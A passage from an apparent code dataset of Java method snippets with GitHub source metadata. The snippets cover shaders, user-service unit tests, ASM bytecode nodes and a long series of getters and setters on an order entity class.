"https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59614, "method_name": "getShader", "class_name": "GammaEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \"float gamma=\" + gammaValue + \";\\n\"\n\n                + \"void main() {\\n\"\n\n                + \"vec4 textureColor = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"gl_FragColor = vec4(pow(textureColor.rgb, vec3(gamma)), textureColor.w);\\n\"\n\n                + \"}\\n\";\n\n        return shader;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/GammaEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 59615, "method_name": "setUp", "class_name": "DefaultUsersServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUp() {\n        defaultUsersService = new DefaultUsersService(commandGateway, randomFieldsGenerator, passwordEncoder);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/users/src/test/java/engineering/everest/lhotse/users/services/DefaultUsersServiceTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59616, "method_name": "updateUserDetails_WillSendCommandAndWaitForCompletion", "class_name": "DefaultUsersServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void updateUserDetails_WillSendCommandAndWaitForCompletion() {\n        when(passwordEncoder.encode(\"password-change\")).thenReturn(\"encoded-password-change\");\n\n        defaultUsersService.updateUser(ADMIN_ID, USER_ID, \"email-change\",\n                \"display-name-change\", \"password-change\");\n\n        verify(commandGateway).sendAndWait(new UpdateUserDetailsCommand(USER_ID, \"email-change\",\n                \"display-name-change\", \"encoded-password-change\", ADMIN_ID));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/users/src/test/java/engineering/everest/lhotse/users/services/DefaultUsersServiceTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59617, "method_name": "createNewUser_WillSendCommandAndWaitForCompletion", "class_name": "DefaultUsersServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void createNewUser_WillSendCommandAndWaitForCompletion() {\n        when(passwordEncoder.encode(\"raw-password\")).thenReturn(\"encoded-password\");\n\n        when(randomFieldsGenerator.genRandomUUID()).thenReturn(USER_ID);\n\n        defaultUsersService.createUser(ADMIN_ID, ORGANIZATION_ID, NEW_USER_EMAIL, NEW_USER_DISPLAY_NAME, \"raw-password\");\n\n        verify(commandGateway).sendAndWait(new CreateUserCommand(USER_ID, ORGANIZATION_ID, ADMIN_ID, NEW_USER_EMAIL, \"encoded-password\", NEW_USER_DISPLAY_NAME));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/users/src/test/java/engineering/everest/lhotse/users/services/DefaultUsersServiceTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59618, "method_name": "storeProfilePhoto_WillSendCommandAndWaitForCompletion", "class_name": "DefaultUsersServiceTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void storeProfilePhoto_WillSendCommandAndWaitForCompletion() {\n        defaultUsersService.storeProfilePhoto(USER_ID, PROFILE_PHOTO_FILE_ID);\n        verify(commandGateway).sendAndWait(new RegisterUploadedUserProfilePhotoCommand(USER_ID, PROFILE_PHOTO_FILE_ID));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/users/src/test/java/engineering/everest/lhotse/users/services/DefaultUsersServiceTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59619, "method_name": "injectCBTPack", "class_name": "ReloadableResourceManagerImplMixin", "params": ["Executor", "Executor", "CompletableFuture<Unit>", "List<ResourcePack>", "CallbackInfoReturnable<ResourceReloadMonitor>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void injectCBTPack(Executor prepareExecutor, Executor applyExecutor, CompletableFuture<Unit> initialStage, List<ResourcePack> packs, CallbackInfoReturnable<ResourceReloadMonitor> cir) {\n\t\tConnectedBlockTextures.RESOURCE_PACK_PRIORITY_MAP.clear();\n\t\tfor(int i = 0; i < packs.size(); i++) {\n\t\t\tSystem.out.println(i + \" \" + packs.get(i).getName());\n\t\t\tConnectedBlockTextures.RESOURCE_PACK_PRIORITY_MAP.put(packs.get(i).getName(), i);\n\t\t}\n\t\tSystem.out.println(\"sans undertale\");\n\t\tpacks.add(ConnectedBlockTextures.resourcePack = new CBTResourcePack(this));\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/mixin/ReloadableResourceManagerImplMixin.java", "stars": "3", "class_props": {"extends": null, "implements": ["ReloadableResourceManager"], "modifiers": ["public", "abstract"]}}, {"id": 59620, "method_name": "getType", "class_name": "IincInsnNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getType() {\n    return IINC_INSN;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/tree/IincInsnNode.java", "stars": "97", "class_props": {"extends": "AbstractInsnNode", "implements": null, "modifiers": ["public"]}}, {"id": 59621, "method_name": "accept", "class_name": "IincInsnNode", "params": ["MethodVisitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void accept(final MethodVisitor methodVisitor) {\n    methodVisitor.visitIincInsn(var, incr);\n    acceptAnnotations(methodVisitor);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/tree/IincInsnNode.java", "stars": "97", "class_props": {"extends": "AbstractInsnNode", "implements": null, "modifiers": ["public"]}}, {"id": 59622, "method_name": "clone", "class_name": "IincInsnNode", "params": ["Map<LabelNode,LabelNode>"], "throws": null, "modifiers": ["public"], "return_type": "AbstractInsnNode", "snippet": "  public AbstractInsnNode clone(final Map<LabelNode, LabelNode> clonedLabels) {\n    return new IincInsnNode(var, incr).cloneAnnotations(this);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/tree/IincInsnNode.java", "stars": "97", "class_props": {"extends": "AbstractInsnNode", "implements": null, "modifiers": ["public"]}}, {"id": 59623, "method_name": "main", "class_name": "Rating", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\t\n\t\tString message = getRatingMessage(MovieRating.EXCELLENT);\n\t\tSystem.out.println(message);\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day12/Rating.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59624, "method_name": "getRatingMessage", "class_name": "Rating", "params": ["MovieRating"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String getRatingMessage(MovieRating rating) {\n\t\tString message;\n\t\t\n\t\tswitch(rating) {\n\t\tcase EXCELLENT:\n\t\t\tmessage = \"You must see this movie!\";\n\t\t\tbreak;\n\t\tcase AVERAGE:\n\t\t\tmessage = \"This movie is OK, but not great.\";\n\t\t\tbreak;\n\t\tcase BAD:\n\t\t\tmessage = \"Skip it!\";\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tmessage = \"Something is wrong\";\n\t\t\tbreak;\n\t\t}\n\t\t\n\t\treturn message;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day12/Rating.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59625, "method_name": "run", "class_name": "DataChecker", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void run() {\n\t\tif(p == null) {\n\t\t\tthrow new RuntimeException(\"Properties is null. Can't continue\");\n\t\t}\n\t\tif (!p.containsKey(SOURCE_TYPE)) {\n//\t\t    throw new RuntimeException(\"Must specify a \" + SOURCE_TYPE\n//\t\t          + \" key and value.\");\n\t\t\tlogger.info(\"Properties \"  + SOURCE_TYPE + \" value is Null !\");\n\t\t}\n\t\tif (!p.containsKey(DATA_OBJECT)) {\n//\t\t\tthrow new RuntimeException(\"Must specify a \" + DATA_OBJECT\n//\t\t\t          + \" key and value.\");\n\t\t\tlogger.info(\"Properties \" + DATA_OBJECT + \" value is Null !\");\n\t\t}\n\t\tWBDataCheckerDao wbDao = WBDataCheckerDao.getInstance();\n\t\t\n\t\tboolean success = wbDao.validateTableStatusFunction(p, logger);\n\t\tif(!success) {\n\t\t\tthrow new RuntimeException(\"Data not found.\");\n\t\t}\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/DataChecker.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59626, "method_name": "cancel", "class_name": "DataChecker", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cancel() throws Exception {\n\t\tWBDataCheckerDao.closeDruidDataSource();\n\t\tthrow new RuntimeException(\"Kill this datachecker.\");\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/DataChecker.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59627, "method_name": "getService", "class_name": "ServiceChangeEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Service", "snippet": "    public Service getService() {\n        return service;\n    }", "url": "https://raw.githubusercontent.com/lzj-github/registry/master/naming/src/main/java/cn/lzj/nacos/naming/push/ServiceChangeEvent.java", "stars": "34", "class_props": {"extends": "ApplicationEvent", "implements": null, "modifiers": ["public"]}}, {"id": 59628, "method_name": "getMessageId", "class_name": "ServiceChangeEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMessageId(){\n        return messageId;\n    }", "url": "https://raw.githubusercontent.com/lzj-github/registry/master/naming/src/main/java/cn/lzj/nacos/naming/push/ServiceChangeEvent.java", "stars": "34", "class_props": {"extends": "ApplicationEvent", "implements": null, "modifiers": ["public"]}}, {"id": 59629, "method_name": "setId", "class_name": "OrderDO", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId(Long id) {\n\t\tthis.id = id;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59630, "method_name": "getId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getId() {\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59631, "method_name": "setFbMerchantCode", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFbMerchantCode(String fbMerchantCode) {\n\t\tthis.fbMerchantCode = fbMerchantCode;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59632, "method_name": "getFbMerchantCode", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getFbMerchantCode() {\n\t\treturn fbMerchantCode;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59633, "method_name": "setMerchantOrderSn", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMerchantOrderSn(String merchantOrderSn) {\n\t\tthis.merchantOrderSn = merchantOrderSn;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59634, "method_name": "getMerchantOrderSn", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getMerchantOrderSn() {\n\t\treturn merchantOrderSn;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59635, "method_name": "setOrderSn", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOrderSn(String orderSn) {\n\t\tthis.orderSn = orderSn;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59636, "method_name": "getOrderSn", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getOrderSn() {\n\t\treturn orderSn;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59637, "method_name": "setPlatformOrderNo", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPlatformOrderNo(String platformOrderNo) {\n\t\tthis.platformOrderNo = platformOrderNo;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59638, "method_name": "getPlatformOrderNo", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPlatformOrderNo() {\n\t\treturn platformOrderNo;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59639, "method_name": "setTradeNo", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTradeNo(String tradeNo) {\n\t\tthis.tradeNo = tradeNo;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59640, "method_name": "getTradeNo", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getTradeNo() {\n\t\treturn tradeNo;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59641, "method_name": "setOrderState", "class_name": "OrderDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOrderState(Integer orderState) {\n\t\tthis.orderState = orderState;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59642, "method_name": "getOrderState", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "\tpublic Integer getOrderState() {\n\t\treturn orderState;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59643, "method_name": "setFnCoupon", "class_name": "OrderDO", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFnCoupon(Double fnCoupon) {\n\t\tthis.fnCoupon = fnCoupon;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59644, "method_name": "getFnCoupon", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "\tpublic Double getFnCoupon() {\n\t\treturn fnCoupon;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59645, "method_name": "setRedPacket", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setRedPacket(BigDecimal redPacket) {\n\t\tthis.redPacket = redPacket;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59646, "method_name": "getRedPacket", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getRedPacket() {\n\t\treturn redPacket;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59647, "method_name": "setTotalFee", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTotalFee(BigDecimal totalFee) {\n\t\tthis.totalFee = totalFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59648, "method_name": "getTotalFee", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getTotalFee() {\n\t\treturn totalFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59649, "method_name": "setOrderPrice", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOrderPrice(BigDecimal orderPrice) {\n\t\tthis.orderPrice = orderPrice;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59650, "method_name": "getOrderPrice", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getOrderPrice() {\n\t\treturn orderPrice;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59651, "method_name": "setFee", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFee(BigDecimal fee) {\n\t\tthis.fee = fee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59652, "method_name": "getFee", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getFee() {\n\t\treturn fee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59653, "method_name": "setBody", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBody(String body) {\n\t\tthis.body = body;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59654, "method_name": "getBody", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getBody() {\n\t\treturn body;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59655, "method_name": "setAttach", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAttach(String attach) {\n\t\tthis.attach = attach;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59656, "method_name": "getAttach", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAttach() {\n\t\treturn attach;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59657, "method_name": "setStoreId", "class_name": "OrderDO", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStoreId(Long storeId) {\n\t\tthis.storeId = storeId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59658, "method_name": "getStoreId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getStoreId() {\n\t\treturn storeId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59659, "method_name": "setCashierId", "class_name": "OrderDO", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCashierId(Long cashierId) {\n\t\tthis.cashierId = cashierId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59660, "method_name": "getCashierId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getCashierId() {\n\t\treturn cashierId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59661, "method_name": "setDeviceNo", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDeviceNo(String deviceNo) {\n\t\tthis.deviceNo = deviceNo;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59662, "method_name": "getDeviceNo", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDeviceNo() {\n\t\treturn deviceNo;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59663, "method_name": "setUserId", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUserId(String userId) {\n\t\tthis.userId = userId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59664, "method_name": "getUserId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getUserId() {\n\t\treturn userId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59665, "method_name": "setUserLogonId", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUserLogonId(String userLogonId) {\n\t\tthis.userLogonId = userLogonId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59666, "method_name": "getUserLogonId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getUserLogonId() {\n\t\treturn userLogonId;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59667, "method_name": "setPayTime", "class_name": "OrderDO", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPayTime(Date payTime) {\n\t\tthis.payTime = payTime;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59668, "method_name": "getPayTime", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getPayTime() {\n\t\treturn payTime;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59669, "method_name": "setPayChannel", "class_name": "OrderDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPayChannel(Integer payChannel) {\n\t\tthis.payChannel = payChannel;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59670, "method_name": "getPayChannel", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "\tpublic Integer getPayChannel() {\n\t\treturn payChannel;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59671, "method_name": "setNoCashCouponFee", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setNoCashCouponFee(BigDecimal noCashCouponFee) {\n\t\tthis.noCashCouponFee = noCashCouponFee;\n\t}", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/test/domain/OrderDO.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 59672, "method_name": "getNoCashCouponFee", "class_name": "OrderDO", "params": [], 